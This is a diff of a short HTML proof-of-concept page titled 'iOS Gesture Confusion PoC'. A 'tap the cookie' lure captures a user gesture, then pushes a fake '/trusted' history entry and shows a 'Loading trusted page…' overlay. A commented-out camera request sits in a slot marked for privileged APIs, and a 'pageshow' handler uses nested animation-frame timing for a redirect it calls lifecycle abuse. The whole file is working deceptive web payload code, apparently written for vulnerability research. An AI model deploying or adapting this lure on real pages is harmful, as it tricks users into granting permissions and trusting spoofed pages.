@@ -1,16 +1,57 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="utf-8">
+<title>iOS Gesture Confusion PoC</title>
+<style>
+  #cookie {
+    font-size: 40px;
+    position: absolute;
+    left: 120px;
+    top: 120px;
+  }
+  #panel {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.6);
+    color: white;
+    font-size: 24px;
+    padding: 40px;
+  }
+</style>
+</head>
+
 <body>
-Tap cookie secepat mungkin 🍪
-<div id="cookie" style="font-size:40px; position:absolute; left:120px; top:120px;">🍪</div>
+Tap cookie as fast as possible 🍪
+<div id="cookie">🍪</div>
+
+<div id="panel">
+  Loading trusted page…
+</div>
 
 <script>
-const cookie = document.getElementById("cookie");
+const trigger = document.getElementById("cookie");
+const panel = document.getElementById("panel");
 
-cookie.addEventListener("touchstart", e => {
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(() => console.log("camera granted"))
-    .catch(err => console.error(err));
+/* USER GESTURE */
+trigger.addEventListener("touchstart", () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+
+  // privileged API can be placed here if needed
+  // navigator.mediaDevices.getUserMedia({ video: true });
+});
+
+/* PAGE LIFECYCLE ABUSE */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 0);
+    });
+  });
 });
 </script>
 </body>
